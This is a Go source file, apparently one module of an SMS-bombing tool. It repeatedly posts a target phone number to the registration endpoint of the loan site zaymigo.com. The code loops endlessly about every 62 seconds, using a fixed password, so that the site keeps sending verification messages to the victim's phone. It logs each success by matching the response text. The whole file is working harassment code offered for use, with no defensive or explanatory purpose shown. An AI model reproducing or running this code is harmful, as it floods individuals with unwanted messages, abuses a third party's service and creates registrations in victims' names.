package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func zaymigo() {
	req := newreq()
	req.SetBodyString("role=borrower&register_phone=" + num + "&password=nmfgio&password_confirm=nmfgio&register_agreements=1")
	req.SetRequestURI("https://zaymigo.com/register")
	req.Header.SetMethod("POST")

	timeout := time.Minute + time.Second*2
	if logging > 0 {
		var (
			err  error
			body string
			res  = &fasthttp.Response{}
		)

		for do {
			err = client.Do(req, res)

			body = string(res.Body())
			if err == nil && (strings.Index(body, `status":"success`) != -1 || strings.Index(body, `\u0432\u0445\u043e\u0434\u0430.<div>"}`) != -1) {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
